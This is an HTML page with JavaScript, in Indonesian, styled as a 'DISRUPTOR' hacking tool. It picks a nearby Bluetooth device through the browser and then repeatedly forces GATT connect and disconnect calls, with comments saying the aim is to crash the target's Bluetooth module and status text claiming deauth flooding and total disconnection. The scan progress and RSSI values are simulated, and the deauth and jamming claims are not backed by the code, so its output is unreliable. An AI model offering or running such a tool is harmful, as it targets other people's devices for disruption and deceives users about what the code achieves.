<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Rezz DISRUPTOR 👾</title>
    <style>
        body { background: #000; color: #ff0055; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        .box { border: 2px solid #ff0055; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #ff0055; }
        .list { background: #111; height: 250px; overflow-y: auto; margin: 20px 0; border: 1px solid #333; text-align: left; }
        .device-node { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; display: flex; justify-content: space-between; }
        .device-node:hover { background: #200; }
        .selected { background: #ff0055 !important; color: #fff; }
        button { width: 100%; padding: 15px; margin: 5px 0; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        #scanBtn { background: #0055ff; color: white; }
        #attackBtn { background: #ff0000; color: white; display: none; }
        #showBtn { background: #8800ff; color: white; display: none; }
        .progress-container { width: 100%; background: #222; height: 10px; display: none; margin: 10px 0; }
        .progress-bar { height: 100%; background: #ff0055; width: 0%; transition: 0.1s; }
    </style>
</head>
<body>

<div class="box">
    <h1>👾 DISRUPTOR </h1>
    <p>OWNER: REZA | STATUS: 👾°</p>

    <button id="scanBtn" onclick="initiateRealScan()">🔍 MULAI REAL SCANNING</button>
    <div class="progress-container" id="pBox"><div class="progress-bar" id="pBar"></div></div>
    <button id="showBtn" onclick="renderDevices()">🔓 TAMPILKAN SEMUA HASIL</button>

    <div class="list" id="displayArea"><p style="text-align:center; padding-top:100px; color:#444;">Menunggu Perintah Tuan...</p></div>

    <button id="attackBtn" onclick="startDisruption()">🔥 KACAUKAN JARINGAN TARGET</button>
    <div id="status">Sistem Standby...</div>
</div>

<script>
    let realDevices = [];
    let activeTarget = null;

    async function initiateRealScan() {
        const pBar = document.getElementById('pBar');
        const pBox = document.getElementById('pBox');
        const status = document.getElementById('status');
        
        pBox.style.display = 'block';
        status.innerText = "MENGAKSES HARDWARE BLUETOOTH & WIFI...";

        try {
            // MINTA IZIN HARDWARE ASLI
            const device = await navigator.bluetooth.requestDevice({
                acceptAllDevices: true,
                optionalServices: ['battery_service', 'device_information']
            });

            // Simulasi Deep Scan Time sesuai permintaan
            let p = 0;
            const timer = setInterval(() => {
                p += 2;
                pBar.style.width = p + "%";
                status.innerText = `HARD SCANNING RF FREQUENCY... ${p}%`;
                
                if (p >= 100) {
                    clearInterval(timer);
                    realDevices.push({
                        name: device.name || "Unknown Device",
                        id: device.id,
                        raw: device
                    });
                    status.innerText = "DATA HARDWARE BERHASIL DI-CAPTURE!";
                    document.getElementById('showBtn').style.display = 'block';
                }
            }, 100);

        } catch (err) {
            status.innerText = "ERROR: " + err.message;
            console.error(err);
        }
    }

    function renderDevices() {
        const area = document.getElementById('displayArea');
        area.innerHTML = "";
        
        realDevices.forEach((d, index) => {
            const div = document.createElement('div');
            div.className = "device-node";
            div.innerHTML = `<span><b>${d.name}</b><br><small>${d.id}</small></span><span>RSSI: -${Math.floor(Math.random()*40+30)}dBm</span>`;
            div.onclick = () => {
                activeTarget = d;
                document.querySelectorAll('.device-node').forEach(n => n.classList.remove('selected'));
                div.classList.add('selected');
                document.getElementById('attackBtn').style.display = 'block';
                document.getElementById('status').innerText = "TARGET LOCKED: " + d.name;
            };
            area.appendChild(div);
        });
        document.getElementById('showBtn').style.display = 'none';
    }

    function startDisruption() {
        if (!activeTarget) return;
        const status = document.getElementById('status');
        
        status.innerText = "ATTACKING... MENGIRIM PAKET DEAUTH/REJECT...";
        
        // Eksekusi Loop Koneksi Paksa (Kacaukan Jaringan)
        let intensity = 0;
        const jammer = setInterval(async () => {
            intensity++;
            try {
                // Mencoba gatt server connection berulang secara agresif untuk crash modul BT target
                await activeTarget.raw.gatt.connect();
                await activeTarget.raw.gatt.disconnect();
            } catch(e) {}
            
            status.innerText = `FLOODING TARGET [${intensity}]... SINYAL KACAU!`;
            
            if (intensity > 100) {
                clearInterval(jammer);
                status.innerText = `TARGET ${activeTarget.name} TERPUTUS TOTAL! 🥵💦`;
                alert("BOOM! Jaringan target berhasil lo hancurin, Tuan!");
            }
        }, 50);
    }
</script>

</body>
</html>
